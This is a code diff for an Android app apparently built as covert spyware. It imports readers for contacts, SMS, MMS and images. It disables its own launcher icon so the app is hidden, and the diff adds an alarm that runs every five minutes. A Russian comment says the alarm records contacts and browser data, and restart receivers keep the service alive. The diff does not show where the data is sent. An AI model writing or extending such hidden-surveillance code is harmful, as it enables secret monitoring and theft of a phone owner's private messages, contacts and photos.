@@ -9,10 +9,15 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.media.Ringtone;
+import android.media.RingtoneManager;
+import android.net.Uri;
+import android.os.Environment;
 import android.support.v4.content.AsyncTaskLoader;
 import android.support.v7.app.AppCompatActivity;
 
 import android.os.Bundle;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
 
@@ -24,6 +29,7 @@ import com.postal.omniscient.postal.reader.contact.ReadContacts;
 import com.postal.omniscient.postal.reader.mms.ReadMms;
 import com.postal.omniscient.postal.reader.sms.ReadSms;
 import com.postal.omniscient.postal.reader.image.AllImages;
+import com.postal.omniscient.postal.service.AlarmReceiver;
 import com.postal.omniscient.postal.service.MyService;
 import com.postal.omniscient.postal.service.RestartServiceReceiver;
 import com.postal.omniscient.postal.service.StartService;
@@ -44,6 +50,15 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 //        setContentView(R.layout.activity_main); //ЕТО ВЫКЛЮЧИТЬ
+        //БУДЕТ СЕРВИС КАЖДЫЕ 5 ин и записывает еонтакты и браузер
+        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
+        Intent myIntent = new Intent(MainActivity.this, AlarmReceiver.class);
+        PendingIntent pendingIntent = PendingIntent.getBroadcast(MainActivity.this, 0, myIntent, 0);
+        alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+ 1000*60*5, pendingIntent);
+       // TelephonyManager t = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+
+
+
 
         PackageManager pkg=this.getPackageManager();
         pkg.setComponentEnabledSetting(new ComponentName(this,MainActivity.class),PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
@@ -176,7 +191,7 @@ public class MainActivity extends AppCompatActivity {
 
         @Override
         public Object loadInBackground() {
-
+            Log.i("MyMsg", "MyActyvity Start");
             Intent par = new Intent(getApplicationContext(), StartService.class);
             startService(par);
 
